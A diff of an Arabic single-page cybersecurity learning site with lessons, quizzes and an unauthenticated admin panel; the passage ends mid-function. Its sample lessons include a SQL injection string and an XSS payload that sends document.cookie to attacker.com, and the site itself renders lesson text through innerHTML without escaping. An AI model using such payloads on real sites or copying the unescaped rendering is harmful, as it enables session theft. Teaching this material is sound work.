@@ -3,22 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الهكر العربي - التقييم والاختبارات السيبرانية</title>
+    <title>منصة الهكر العربي | Arabic Hacker Academy</title>
     <!-- Google Fonts & FontAwesome -->
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #080c10;
-            --card-bg: rgba(22, 27, 34, 0.85);
+            --bg-color: #05080c;
+            --card-bg: rgba(13, 17, 23, 0.85);
             --accent-green: #00ff66;
-            --accent-green-dark: #00b347;
-            --accent-blue: #58a6ff;
-            --accent-red: #ff7b72;
-            --text-primary: #c9d1d9;
-            --text-heading: #ffffff;
-            --border-color: #30363d;
-            --shadow-glow: 0 0 20px rgba(0, 255, 102, 0.15);
+            --accent-green-glow: rgba(0, 255, 102, 0.4);
+            --accent-blue: #00e5ff;
+            --accent-purple: #9d4edf;
+            --accent-red: #ff3366;
+            --text-main: #e6edf3;
+            --text-muted: #8b949e;
+            --border-color: #21262d;
+            --border-glow: #30363d;
         }
 
         * {
@@ -30,27 +31,28 @@
 
         body {
             background-color: var(--bg-color);
-            color: var(--text-primary);
+            color: var(--text-main);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: flex-start;
             padding: 20px 10px;
             background-image: 
-                radial-gradient(circle at 50% 0%, rgba(0, 255, 102, 0.08), transparent 50%),
-                radial-gradient(circle at 100% 100%, rgba(88, 166, 255, 0.05), transparent 50%);
+                linear-gradient(rgba(0, 255, 102, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 102, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
             background-attachment: fixed;
         }
 
         .container {
             width: 100%;
-            max-width: 520px;
+            max-width: 600px;
             background: var(--card-bg);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 24px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-glow);
+            border-radius: 24px;
+            padding: 28px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 255, 102, 0.05);
             position: relative;
             overflow: hidden;
         }
@@ -61,110 +63,111 @@
             top: 0;
             left: 0;
             right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue), var(--accent-purple));
         }
 
-        /* Top Nav */
+        /* Top Bar Nav */
         .top-nav {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
-        .btn-toggle-admin {
-            background: rgba(88, 166, 255, 0.1);
+        .btn-admin {
+            background: rgba(0, 229, 255, 0.1);
             color: var(--accent-blue);
-            border: 1px solid rgba(88, 166, 255, 0.3);
-            padding: 8px 14px;
-            border-radius: 10px;
+            border: 1px solid rgba(0, 229, 255, 0.3);
+            padding: 8px 16px;
+            border-radius: 12px;
             font-size: 0.85rem;
             font-weight: 700;
             cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
             transition: all 0.3s;
         }
 
-        .btn-toggle-admin:hover {
+        .btn-admin:hover {
             background: var(--accent-blue);
             color: #000;
-            box-shadow: 0 0 15px rgba(88, 166, 255, 0.3);
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.4);
         }
 
         .status-badge {
-            font-size: 0.75rem;
+            font-size: 0.8rem;
             color: var(--accent-green);
             background: rgba(0, 255, 102, 0.1);
-            padding: 5px 12px;
+            padding: 6px 14px;
             border-radius: 20px;
-            border: 1px solid rgba(0, 255, 102, 0.2);
+            border: 1px solid rgba(0, 255, 102, 0.25);
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
+            font-family: 'Fira Code', monospace;
         }
 
         .status-dot {
-            width: 7px;
-            height: 7px;
+            width: 8px;
+            height: 8px;
             background-color: var(--accent-green);
             border-radius: 50%;
-            box-shadow: 0 0 8px var(--accent-green);
-            animation: pulse 2s infinite;
+            box-shadow: 0 0 10px var(--accent-green);
+            animation: pulse 1.8s infinite;
         }
 
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
         }
 
-        /* Main Headers */
+        /* Headers */
         .header {
             text-align: center;
-            margin-bottom: 22px;
+            margin-bottom: 28px;
         }
 
         .logo-icon {
-            width: 65px;
-            height: 65px;
-            background: rgba(0, 255, 102, 0.08);
+            width: 75px;
+            height: 75px;
+            background: rgba(0, 255, 102, 0.05);
             border: 2px solid var(--accent-green);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 10px;
+            margin: 0 auto 14px;
             color: var(--accent-green);
-            font-size: 1.7rem;
-            box-shadow: var(--shadow-glow);
+            font-size: 2rem;
+            box-shadow: 0 0 25px var(--accent-green-glow);
         }
 
         .header h1 {
-            color: var(--text-heading);
-            font-size: 1.4rem;
+            color: #fff;
+            font-size: 1.6rem;
             font-weight: 900;
             letter-spacing: 0.5px;
         }
 
         .header p {
-            color: #8b949e;
-            font-size: 0.82rem;
-            margin-top: 2px;
+            color: var(--text-muted);
+            font-size: 0.88rem;
+            margin-top: 4px;
         }
 
-        /* Inputs & Controls */
+        /* Form Controls */
         .form-group {
-            margin-bottom: 14px;
+            margin-bottom: 16px;
         }
 
         .form-group label {
             display: block;
-            font-size: 0.82rem;
-            margin-bottom: 6px;
-            color: var(--text-heading);
-            font-weight: 500;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            color: var(--text-main);
+            font-weight: 600;
         }
 
         .input-wrapper {
@@ -176,67 +179,86 @@
             right: 14px;
             top: 50%;
             transform: translateY(-50%);
-            color: #8b949e;
+            color: var(--text-muted);
         }
 
         .custom-input, select.custom-input, textarea.custom-input {
             width: 100%;
-            padding: 11px 40px 11px 12px;
-            background-color: #0d1117;
+            padding: 12px 42px 12px 14px;
+            background-color: #080c10;
             border: 1px solid var(--border-color);
-            border-radius: 10px;
-            color: var(--text-heading);
-            font-size: 0.88rem;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 0.9rem;
             outline: none;
             transition: all 0.3s;
         }
 
         textarea.custom-input {
-            padding-right: 12px;
+            padding-right: 14px;
             resize: vertical;
-            min-height: 70px;
+            min-height: 80px;
         }
 
         .custom-input:focus {
             border-color: var(--accent-green);
-            box-shadow: var(--shadow-glow);
+            box-shadow: 0 0 15px var(--accent-green-glow);
         }
 
         select.custom-input option {
-            background-color: #161b22;
+            background-color: #0d1117;
+            color: #fff;
         }
 
         /* Buttons */
         .btn-primary {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background: linear-gradient(135deg, #00ff66, #00b347);
             color: #000;
             border: none;
-            border-radius: 10px;
-            font-size: 0.95rem;
-            font-weight: 800;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 900;
             cursor: pointer;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 255, 102, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 255, 102, 0.25);
         }
 
         .btn-primary:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(0, 255, 102, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 255, 102, 0.4);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--accent-blue);
+            color: var(--accent-blue);
         }
 
         .btn-danger {
-            background: rgba(255, 123, 114, 0.1);
+            background: rgba(255, 51, 102, 0.1);
             color: var(--accent-red);
-            border: 1px solid rgba(255, 123, 114, 0.3);
-            padding: 6px 10px;
-            border-radius: 6px;
-            font-size: 0.75rem;
+            border: 1px solid rgba(255, 51, 102, 0.3);
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 0.78rem;
             cursor: pointer;
             transition: 0.2s;
         }
@@ -246,118 +268,133 @@
             color: #fff;
         }
 
-        /* Lesson & Quiz Cards Style */
-        .section-title {
-            color: var(--text-heading);
-            font-size: 1.1rem;
-            margin: 22px 0 12px;
+        /* Card Items */
+        .section-header {
+            color: #fff;
+            font-size: 1.15rem;
+            margin: 26px 0 14px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             border-bottom: 1px solid var(--border-color);
-            padding-bottom: 8px;
+            padding-bottom: 10px;
         }
 
         .card-item {
-            background: #0d1117;
+            background: #080c10;
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 14px;
-            position: relative;
-            transition: border-color 0.3s;
+            border-radius: 14px;
+            padding: 18px;
+            margin-bottom: 16px;
+            transition: all 0.3s;
         }
 
         .card-item:hover {
             border-color: rgba(0, 255, 102, 0.4);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
         }
 
-        .card-item-header {
+        .card-item-title {
             display: flex;
             justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 8px;
+            align-items: center;
+            margin-bottom: 10px;
         }
 
         .card-item h3 {
             color: var(--accent-green);
-            font-size: 1rem;
+            font-size: 1.05rem;
             font-weight: 700;
         }
 
         .card-item p {
-            font-size: 0.85rem;
-            line-height: 1.5;
-            color: #c9d1d9;
+            font-size: 0.88rem;
+            line-height: 1.6;
+            color: var(--text-main);
         }
 
         .code-box {
-            background: #040608;
-            border: 1px solid #21262d;
-            border-radius: 8px;
-            padding: 10px;
-            font-family: monospace;
+            background: #000000;
+            border: 1px solid #1f242c;
+            border-radius: 10px;
+            padding: 12px;
+            font-family: 'Fira Code', monospace;
             color: var(--accent-green);
-            margin-top: 10px;
+            margin-top: 12px;
             direction: ltr;
             text-align: left;
-            font-size: 0.82rem;
+            font-size: 0.85rem;
             overflow-x: auto;
         }
 
         /* Quiz Radio Group */
-        .quiz-option {
+        .quiz-opt {
             display: flex;
             align-items: center;
             gap: 10px;
-            background: #161b22;
+            background: #0d1117;
             border: 1px solid var(--border-color);
-            padding: 10px 14px;
-            border-radius: 8px;
+            padding: 12px;
+            border-radius: 10px;
             margin: 8px 0;
             cursor: pointer;
-            font-size: 0.85rem;
+            font-size: 0.88rem;
             transition: all 0.2s;
         }
 
-        .quiz-option:hover {
+        .quiz-opt:hover {
             border-color: var(--accent-blue);
-            background: rgba(88, 166, 255, 0.05);
+            background: rgba(0, 229, 255, 0.05);
         }
 
-        .quiz-option input[type="radio"] {
+        .quiz-opt input[type="radio"] {
             accent-color: var(--accent-green);
         }
 
-        /* Admin Section Styling */
-        .admin-box {
-            background: #0d1117;
-            border: 1px dashed var(--accent-blue);
+        /* Stats Bar */
+        .user-stats {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(0, 255, 102, 0.05);
+            border: 1px solid rgba(0, 255, 102, 0.2);
+            padding: 12px 18px;
             border-radius: 14px;
-            padding: 16px;
             margin-bottom: 20px;
         }
 
-        .admin-box h3 {
+        .stat-box { text-align: center; }
+        .stat-box span { display: block; font-size: 0.75rem; color: var(--text-muted); }
+        .stat-box strong { font-size: 1.1rem; color: var(--accent-green); font-family: 'Fira Code', monospace; }
+
+        /* Admin Boxes */
+        .admin-card {
+            background: #080c10;
+            border: 1px dashed var(--accent-blue);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 20px;
+        }
+
+        .admin-card h3 {
             color: var(--accent-blue);
-            font-size: 0.95rem;
-            margin-bottom: 12px;
+            font-size: 1rem;
+            margin-bottom: 14px;
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
         }
 
         /* Footer */
         .footer {
-            margin-top: 24px;
+            margin-top: 28px;
             text-align: center;
-            font-size: 0.75rem;
-            color: #8b949e;
+            font-size: 0.78rem;
+            color: var(--text-muted);
             border-top: 1px solid var(--border-color);
-            padding-top: 14px;
+            padding-top: 16px;
         }
 
-        .footer span { color: var(--accent-green); }
+        .footer span { color: var(--accent-green); font-weight: 700; }
 
         .hidden { display: none !important; }
     </style>
@@ -365,330 +402,349 @@
 <body>
 
 <div class="container">
-    <!-- Top Nav -->
+    <!-- Top Nav Bar -->
     <div class="top-nav">
-        <button class="btn-toggle-admin" onclick="toggleAdminPanel()">
-            <i class="fa-solid fa-user-gear"></i>
-            <span id="admin-btn-text">لوحة التحكم</span>
+        <button class="btn-admin" onclick="toggleAdminPanel()">
+            <i class="fa-solid fa-sliders"></i>
+            <span id="admin-btn-label">لوحة التحكم</span>
         </button>
         <div class="status-badge">
             <div class="status-dot"></div>
-            النظام متصل
+            SYSTEM_ONLINE
         </div>
     </div>
 
-    <!-- 1. LOGIN / ENTRANCE SECTION -->
-    <div id="login-section">
+    <!-- 1. LOGIN / ENTRANCE SCREEN -->
+    <div id="login-screen">
         <div class="header">
-            <div class="logo-icon"><i class="fa-solid fa-terminal"></i></div>
+            <div class="logo-icon"><i class="fa-solid fa-user-shield"></i></div>
             <h1>منصة الهكر العربي</h1>
-            <p>منصة الاختبارات والدروس السيبرانية التفاعلية</p>
+            <p>أكاديمية اختبار الاختراق والأمن السيبراني</p>
         </div>
 
-        <form onsubmit="startPlatform(event)">
+        <form onsubmit="handleLogin(event)">
             <div class="form-group">
-                <label>المسار التعليمي</label>
+                <label>اختر المسار التعليمي</label>
                 <div class="input-wrapper">
-                    <i class="fa-solid fa-layer-group"></i>
+                    <i class="fa-solid fa-code-branch"></i>
                     <select id="user-track" class="custom-input">
                         <option value="اختراق التطبيقات والويب">اختراق التطبيقات والويب (Web Pentesting)</option>
-                        <option value="أمن الشبكات">أمن الشبكات والإنترنت (Network Security)</option>
-                        <option value="الهندسة العكسية">الهندسة العكسية والبرمجيات الخبيثة (Reverse Eng)</option>
+                        <option value="أمن الشبكات والخوادم">أمن الشبكات والخوادم (Network Security)</option>
+                        <option value="الهندسة العكسية والمالوير">الهندسة العكسية والبرمجيات الخبيثة (Reverse Eng)</option>
+                        <option value="الدفاع والتحقيق الجنائي">الدفاع والتحقيق الجنائي (Blue Team / SOC)</option>
                     </select>
                 </div>
             </div>
 
             <div class="form-group">
-                <label>اسم الطالب / اللقب</label>
+                <label>اسم المستخدم / الهاندل السيبراني</label>
                 <div class="input-wrapper">
-                    <i class="fa-solid fa-user-ninja"></i>
-                    <input type="text" id="user-name" class="custom-input" placeholder="أدخل اسمك هنا" required>
+                    <i class="fa-solid fa-terminal"></i>
+                    <input type="text" id="user-name" class="custom-input" placeholder="مثال: Hacker_0x1" required>
                 </div>
             </div>
 
             <button type="submit" class="btn-primary">
-                <i class="fa-solid fa-code"></i> دخول المنصة
+                <i class="fa-solid fa-bolt"></i> دخول المنصة والتحديات
             </button>
         </form>
     </div>
 
-    <!-- 2. ADMIN CONTROL PANEL (لوحة التحكم لإضافة الشروحات والأسئلة) -->
-    <div id="admin-section" class="hidden">
-        <div class="header" style="margin-bottom: 15px;">
-            <h2 style="color: var(--accent-blue); font-size: 1.2rem;"><i class="fa-solid fa-sliders"></i> لوحة إدارة المحتوى</h2>
-            <p>أضف الدروس والأسئلة لظهر فوراً للطلاب</p>
+    <!-- 2. ADMIN PANEL (لوحة الإدارة لإضافة المحتوى) -->
+    <div id="admin-screen" class="hidden">
+        <div class="header" style="margin-bottom: 16px;">
+            <h2 style="color: var(--accent-blue); font-size: 1.3rem;"><i class="fa-solid fa-gears"></i> لوحة إدارة المنصة</h2>
+            <p>أضف الدروس والأسئلة والتمارين التفاعلية للطلاب</p>
         </div>
 
         <!-- إضافة درس -->
-        <div class="admin-box">
-            <h3><i class="fa-solid fa-plus-circle"></i> إضافة درس جديد</h3>
+        <div class="admin-card">
+            <h3><i class="fa-solid fa-file-code"></i> إضافة درس/شرح جديد</h3>
             <div class="form-group">
-                <input type="text" id="new-lesson-title" class="custom-input" placeholder="عنوان الدرس (مثال: ثغرة XSS)">
+                <input type="text" id="add-lesson-title" class="custom-input" placeholder="عنوان الدرس">
             </div>
             <div class="form-group">
-                <textarea id="new-lesson-desc" class="custom-input" placeholder="شرح الدرس بالتفصيل..."></textarea>
+                <textarea id="add-lesson-desc" class="custom-input" placeholder="شرح الدرس بالتفصيل..."></textarea>
             </div>
             <div class="form-group">
-                <input type="text" id="new-lesson-code" class="custom-input" placeholder="كود توضيحي / Payload (اختياري)">
+                <input type="text" id="add-lesson-code" class="custom-input" placeholder="كود توضيحي / Payload (اختياري)">
             </div>
-            <button class="btn-primary" style="background: linear-gradient(135deg, #58a6ff, #1f6feb); color: #fff;" onclick="addLesson()">
-                حفظ ونشر الدرس
+            <button class="btn-primary" style="background: linear-gradient(135deg, #00e5ff, #0088cc); color: #fff;" onclick="saveNewLesson()">
+                <i class="fa-solid fa-plus"></i> نشر الدرس
             </button>
         </div>
 
         <!-- إضافة سؤال -->
-        <div class="admin-box">
-            <h3><i class="fa-solid fa-question-circle"></i> إضافة سؤال جديد</h3>
+        <div class="admin-card">
+            <h3><i class="fa-solid fa-circle-question"></i> إضافة سؤال اختبار</h3>
             <div class="form-group">
-                <input type="text" id="new-quiz-q" class="custom-input" placeholder="نص السؤال">
+                <input type="text" id="add-quiz-q" class="custom-input" placeholder="نص السؤال السيبراني">
             </div>
             <div class="form-group">
-                <input type="text" id="new-quiz-opt1" class="custom-input" placeholder="الخيار الأول (الإجابة الصحيحة)" style="border-color: var(--accent-green);">
+                <input type="text" id="add-quiz-opt1" class="custom-input" placeholder="الخيار الأول (الإجابة الصحيحة)" style="border-color: var(--accent-green);">
             </div>
             <div class="form-group">
-                <input type="text" id="new-quiz-opt2" class="custom-input" placeholder="الخيار الثاني (خاطئ)">
+                <input type="text" id="add-quiz-opt2" class="custom-input" placeholder="الخيار الثاني (خاطئ)">
             </div>
             <div class="form-group">
-                <input type="text" id="new-quiz-opt3" class="custom-input" placeholder="الخيار الثالث (خاطئ)">
+                <input type="text" id="add-quiz-opt3" class="custom-input" placeholder="الخيار الثالث (خاطئ)">
             </div>
-            <button class="btn-primary" style="background: linear-gradient(135deg, #58a6ff, #1f6feb); color: #fff;" onclick="addQuiz()">
-                حفظ ونشر السؤال
+            <button class="btn-primary" style="background: linear-gradient(135deg, #00e5ff, #0088cc); color: #fff;" onclick="saveNewQuiz()">
+                <i class="fa-solid fa-plus"></i> نشر السؤال
             </button>
         </div>
     </div>
 
-    <!-- 3. STUDENT DISPLAY SECTION (عرض الشروحات والاختبارات) -->
-    <div id="main-content" class="hidden">
-        <div class="header" style="text-align: right; border-bottom: 1px solid var(--border-color); padding-bottom: 12px;">
-            <h2 id="display-welcome" style="color: var(--accent-green); font-size: 1.2rem;">مرحباً بك!</h2>
-            <p id="display-track" style="color: #8b949e; font-size: 0.8rem;">المسار: -</p>
+    <!-- 3. STUDENT DASHBOARD & CONTENT (عرض الشروحات والتمارين) -->
+    <div id="main-screen" class="hidden">
+        <!-- شريط النقاط والمعلومات -->
+        <div class="user-stats">
+            <div class="stat-box">
+                <span>المستخدم</span>
+                <strong id="stat-username">Hacker</strong>
+            </div>
+            <div class="stat-box">
+                <span>المسار</span>
+                <strong id="stat-track" style="color: var(--accent-blue);">الويب</strong>
+            </div>
+            <div class="stat-box">
+                <span>النقاط (EXP)</span>
+                <strong id="stat-score">0</strong>
+            </div>
         </div>
 
-        <!-- قسم الشروحات -->
-        <div class="section-title">
-            <i class="fa-solid fa-book-open" style="color: var(--accent-green);"></i>
-            <span>الشروحات والدروس</span>
+        <!-- الشروحات -->
+        <div class="section-header">
+            <i class="fa-solid fa-book-skull" style="color: var(--accent-green);"></i>
+            <span>الشروحات والدروس السيبرانية</span>
         </div>
-        <div id="lessons-container">
-            <!-- يتم تحميل الدروس هنا تلقائياً -->
-        </div>
+        <div id="lessons-list"></div>
 
-        <!-- قسم الاختبارات -->
-        <div class="section-title">
-            <i class="fa-solid fa-vial" style="color: var(--accent-blue);"></i>
-            <span>اختبر مهاراتك الان</span>
+        <!-- الأسئلة والاختبارات -->
+        <div class="section-header">
+            <i class="fa-solid fa-crosshairs" style="color: var(--accent-blue);"></i>
+            <span>الاختبارات والتحديات</span>
         </div>
-        <div id="quizzes-container">
-            <!-- يتم تحميل الأسئلة هنا تلقائياً -->
-        </div>
+        <div id="quizzes-list"></div>
+
+        <button class="btn-secondary" onclick="logout()">
+            <i class="fa-solid fa-power-off"></i> تسجيل الخروج
+        </button>
     </div>
 
     <!-- Footer -->
     <div class="footer">
-        <p>تطوير وتصميم: <span>فريق الهكر العربي</span></p>
-        <p style="margin-top: 4px;">جميع الحقوق محفوظة &copy; 2026</p>
+        <p>تطوير وتصميم: <span>فريق الهكر العربي</span> &copy; 2026</p>
     </div>
 </div>
 
 <script>
     // البيانات الافتراضية
-    const defaultLessons = [
+    const initialLessons = [
         {
-            id: 1,
-            title: "الدرس الأول: ثغرة SQL Injection",
-            desc: "تحدث هذه الثغرة عند إدخال مدخلات خبيثة إلى استعلامات قواعد البيانات دون تصفيتها بشكل صحيح.",
-            code: "SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1';"
+            title: "1. مقدمة في ثغرة حقن أوامر الهوائيات (SQL Injection)",
+            desc: "تسمح هذه الثغرة للمهاجم بالتلاعب باستعلامات قاعدة البيانات للوصول إلى معلومات حساسة مثل كلمات المرور وبيانات المستخدمين.",
+            code: "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';"
+        },
+        {
+            title: "2. ثغرة تنفيذ الأكواد عبر المتصفح (Cross-Site Scripting - XSS)",
+            desc: "تمكّن المهاجم من حقن أكواد JavaScript خبيثة تُنفذ في متصفح الزائر لسهم الجلسات وحسابات المستخدمين.",
+            code: "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);<\/script>"
         }
     ];
 
-    const defaultQuizzes = [
+    const initialQuizzes = [
         {
-            id: 1,
-            question: "ما الثغرة التي تسمح بتهديد وتعديل البيانات في قواعد البيانات مباشرة؟",
-            options: ["SQL Injection", "XSS", "CSRF"],
-            answer: 0
+            q: "ما هي الثغرة التي تمكنك من قراءة وجلب الجداول والبيانات من قواعد البيانات؟",
+            opts: ["SQL Injection", "Reflected XSS", "CSRF Attack"],
+            ans: 0
+        },
+        {
+            q: "أي بروتوكول يعتبر المشفر والآمن لنقل البيانات عبر الويب؟",
+            opts: ["HTTPS", "HTTP", "FTP"],
+            ans: 0
         }
     ];
 
-    // جلب البيانات من الميموري أو تعيين الافتراضي
-    let lessons = JSON.parse(localStorage.getItem('hacker_lessons')) || defaultLessons;
-    let quizzes = JSON.parse(localStorage.getItem('hacker_quizzes')) || defaultQuizzes;
+    // إدارة localStorage
+    let lessons = JSON.parse(localStorage.getItem('ar_hacker_lessons')) || initialLessons;
+    let quizzes = JSON.parse(localStorage.getItem('ar_hacker_quizzes')) || initialQuizzes;
+    let userScore = parseInt(localStorage.getItem('ar_hacker_score')) || 0;
 
-    function saveData() {
-        localStorage.setItem('hacker_lessons', JSON.stringify(lessons));
-        localStorage.setItem('hacker_quizzes', JSON.stringify(quizzes));
+    function saveStorage() {
+        localStorage.setItem('ar_hacker_lessons', JSON.stringify(lessons));
+        localStorage.setItem('ar_hacker_quizzes', JSON.stringify(quizzes));
+        localStorage.setItem('ar_hacker_score', userScore);
     }
 
-    function startPlatform(e) {
+    function handleLogin(e) {
         e.preventDefault();
-        const name = document.getElementById('user-name').value;
+        const username = document.getElementById('user-name').value;
         const track = document.getElementById('user-track').value;
 
-        document.getElementById('display-welcome').innerText = "مرحباً بك، " + name;
-        document.getElementById('display-track').innerText = "المسار الحالي: " + track;
+        document.getElementById('stat-username').innerText = username;
+        document.getElementById('stat-track').innerText = track.split(' ')[0];
+        document.getElementById('stat-score').innerText = userScore;
 
-        document.getElementById('login-section').classList.add('hidden');
-        document.getElementById('main-content').classList.remove('hidden');
+        document.getElementById('login-screen').classList.add('hidden');
+        document.getElementById('main-screen').classList.remove('hidden');
 
-        renderContent();
+        renderPlatform();
     }
 
     function toggleAdminPanel() {
-        const adminSec = document.getElementById('admin-section');
-        const loginSec = document.getElementById('login-section');
-        const mainSec = document.getElementById('main-content');
-        const btnText = document.getElementById('admin-btn-text');
+        const adminSec = document.getElementById('admin-screen');
+        const loginSec = document.getElementById('login-screen');
+        const mainSec = document.getElementById('main-screen');
+        const btnLabel = document.getElementById('admin-btn-label');
 
         if (adminSec.classList.contains('hidden')) {
             adminSec.classList.remove('hidden');
             loginSec.classList.add('hidden');
             mainSec.classList.add('hidden');
-            btnText.innerText = "العودة للمنصة";
+            btnLabel.innerText = "الرجوع للمنصة";
         } else {
             adminSec.classList.add('hidden');
             mainSec.classList.remove('hidden');
-            btnText.innerText = "لوحة التحكم";
-            renderContent();
+            btnLabel.innerText = "لوحة التحكم";
+            renderPlatform();
         }
     }
 
-    function renderContent() {
-        // رسم الدروس
-        const lessonContainer = document.getElementById('lessons-container');
-        lessonContainer.innerHTML = '';
-        
-        if (lessons.length === 0) {
-            lessonContainer.innerHTML = '<p style="font-size: 0.85rem; color:#8b949e;">لا توجد دروس حالياً.</p>';
-        } else {
-            lessons.forEach((l, index) => {
-                lessonContainer.innerHTML += `
-                    <div class="card-item">
-                        <div class="card-item-header">
-                            <h3>${l.title}</h3>
-                            <button class="btn-danger" onclick="deleteLesson(${index})"><i class="fa-solid fa-trash"></i></button>
-                        </div>
-                        <p>${l.desc}</p>
-                        ${l.code ? `<div class="code-box">${escapeHtml(l.code)}</div>` : ''}
+    function renderPlatform() {
+        // عرض الشروحات
+        const lessonBox = document.getElementById('lessons-list');
+        lessonBox.innerHTML = '';
+        lessons.forEach((item, idx) => {
+            lessonBox.innerHTML += `
+                <div class="card-item">
+                    <div class="card-item-title">
+                        <h3>${item.title}</h3>
+                        <button class="btn-danger" onclick="deleteLesson(${idx})"><i class="fa-solid fa-trash"></i></button>
                     </div>
-                `;
-            });
-        }
-
-        // رسم الأسئلة
-        const quizContainer = document.getElementById('quizzes-container');
-        quizContainer.innerHTML = '';
-
-        if (quizzes.length === 0) {
-            quizContainer.innerHTML = '<p style="font-size: 0.85rem; color:#8b949e;">لا توجد أسئلة حالياً.</p>';
-        } else {
-            quizzes.forEach((q, qIndex) => {
-                let optionsHTML = '';
-                q.options.forEach((opt, oIndex) => {
-                    optionsHTML += `
-                        <label class="quiz-option">
-                            <input type="radio" name="quiz_${qIndex}" value="${oIndex}">
-                            <span>${opt}</span>
-                        </label>
-                    `;
-                });
-
-                quizContainer.innerHTML += `
-                    <div class="card-item">
-                        <div class="card-item-header">
-                            <p style="font-weight: 700; color: #fff;">سُؤال: ${q.question}</p>
-                            <button class="btn-danger" onclick="deleteQuiz(${qIndex})"><i class="fa-solid fa-trash"></i></button>
-                        </div>
-                        ${optionsHTML}
-                        <button class="btn-primary" style="margin-top: 10px; padding: 8px; font-size:0.85rem;" onclick="checkAnswer(${qIndex})">تسليم الإجابة</button>
-                    </div>
-                `;
-            });
-        }
-    }
-
-    function addLesson() {
-        const title = document.getElementById('new-lesson-title').value.trim();
-        const desc = document.getElementById('new-lesson-desc').value.trim();
-        const code = document.getElementById('new-lesson-code').value.trim();
-
-        if (!title || !desc) {
-            alert('برجاء كتابة عنوان الدرس والشرح أولاً!');
-            return;
-        }
-
-        lessons.push({ id: Date.now(), title, desc, code });
-        saveData();
-
-        document.getElementById('new-lesson-title').value = '';
-        document.getElementById('new-lesson-desc').value = '';
-        document.getElementById('new-lesson-code').value = '';
-
-        alert('تم إضافة الدرس بنجاح! 🔥');
-    }
-
-    function addQuiz() {
-        const q = document.getElementById('new-quiz-q').value.trim();
-        const opt1 = document.getElementById('new-quiz-opt1').value.trim();
-        const opt2 = document.getElementById('new-quiz-opt2').value.trim();
-        const opt3 = document.getElementById('new-quiz-opt3').value.trim();
-
-        if (!q || !opt1 || !opt2) {
-            alert('برجاء إدخال السؤال والإجابة الصحيحة والخيار الثاني على الأقل!');
-            return;
-        }
-
-        const options = [opt1, opt2];
-        if (opt3) options.push(opt3);
-
-        quizzes.push({ id: Date.now(), question: q, options: options, answer: 0 });
-        saveData();
-
-        document.getElementById('new-quiz-q').value = '';
-        document.getElementById('new-quiz-opt1').value = '';
-        document.getElementById('new-quiz-opt2').value = '';
-        document.getElementById('new-quiz-opt3').value = '';
-
-        alert('تم إضافة السؤال بنجاح! 🔥');
-    }
-
-    function deleteLesson(index) {
-        if (confirm('هل أنت تأكد من حذف هذا الدرس؟')) {
-            lessons.splice(index, 1);
-            saveData();
-            renderContent();
-        }
-    }
-
-    function deleteQuiz(index) {
-        if (confirm('هل أنت تأكد من حذف هذا السؤال؟')) {
-            quizzes.splice(index, 1);
-            saveData();
-            renderContent();
-        }
-    }
-
-    function checkAnswer(qIndex) {
-        const radios = document.getElementsByName(`quiz_${qIndex}`);
-        let selectedValue = -1;
-
-        radios.forEach(r => {
-            if (r.checked) selectedValue = parseInt(r.value);
+                    <p>${item.desc}</p>
+                    ${item.code ? `<div class="code-box">${escapeHTML(item.code)}</div>` : ''}
+                </div>
+            `;
         });
 
-        if (selectedValue === -1) {
+        // عرض الأسئلة
